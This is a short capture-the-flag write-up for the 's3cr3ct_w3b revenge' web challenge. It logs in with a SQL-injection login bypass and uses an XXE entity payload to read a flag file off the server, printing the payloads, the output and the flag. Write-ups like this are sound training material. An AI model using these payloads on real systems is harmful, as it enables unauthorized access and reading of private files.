---
layout: post
title:  "s3cr3ct_w3b revenge"
date:   2025-10-18 16:39:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /qnqsec-2025-s3cr3ct-w3b-revenge/
---

**Title:** s3cr3ct_w3b revenge

**Category:** web

**Description:** I have hidden secret in this web can you find out the secret?
source files are the same as secret web `(not true?)`

**Author:** LemonTea

`http://161.97.155.116:8088`

I visit the site and login the same way as in the first `s3cr3ct_w3b` challenge (`admin:' OR '1'='1`). 

Once I am logged in I need to find the new path to the flag. I download the new challenge files. Im not sure if `source files are the same as secret web` in the description is an accident or purposeful misdirection. When I download the new files I find the path to the flag in the Dockerfile:
```shell
cat Dockerfile  
FROM php:8.2-apache  
  
  
RUN docker-php-ext-install pdo pdo_mysql  
  
RUN a2enmod rewrite  
  
COPY public/ /var/www/html/  
RUN mkdir -p /var/flags && chown www-data:www-data /var/flags  
COPY flag.txt /var/flags/flag.txt  
  
WORKDIR /var/www/html/  
  
EXPOSE 80
```

I update `xxe.xml` to contain this:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY flag SYSTEM "file:///var/flags/flag.txt">
]>
<root>&flag;</root>
```

Once uploaded and parsed I get this output:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY flag SYSTEM "file:///var/flags/flag.txt">
]>
<root>QnQSec{R3v3ng3_15_sw33t_wh3ne_d0n3_r1ght}
</root>
```

`QnQSec{R3v3ng3_15_sw33t_wh3ne_d0n3_r1ght}`